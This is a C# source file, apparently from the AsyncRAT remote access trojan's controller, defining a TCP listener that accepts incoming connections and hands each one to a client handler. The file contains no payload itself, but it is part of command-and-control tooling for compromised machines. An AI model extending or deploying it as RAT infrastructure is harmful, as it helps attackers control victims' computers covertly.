using System.Threading.Tasks;
using System.Net;
using System.Net.Sockets;
using System;
using System.Windows.Forms;

namespace AsyncRAT_Sharp.Sockets
{
    class Listener
    {
        private Socket listener { get; set; }

        public void Connect(object port)
        {
            try
            {
                IPEndPoint IpEndPoint = new IPEndPoint(IPAddress.Any, Convert.ToInt32(port));
                listener = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp)
                {
                    SendBufferSize = 50 * 1024,
                    ReceiveBufferSize = 50 * 1024,
                    ReceiveTimeout = -1,
                    SendTimeout = -1,
                };
                listener.Bind(IpEndPoint);
                listener.Listen(20);
                BeginAccept();
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
                Environment.Exit(0);
            }
        }

        private async void BeginAccept()
        {
            await Task.Delay(1);
            listener.BeginAccept(EndAccept, null);
        }

        private void EndAccept(IAsyncResult ar)
        {
            try
            {
                BeginAccept();
                Clients CL = new Clients(listener.EndAccept(ar));
            }
            catch { }
        }
    }
}
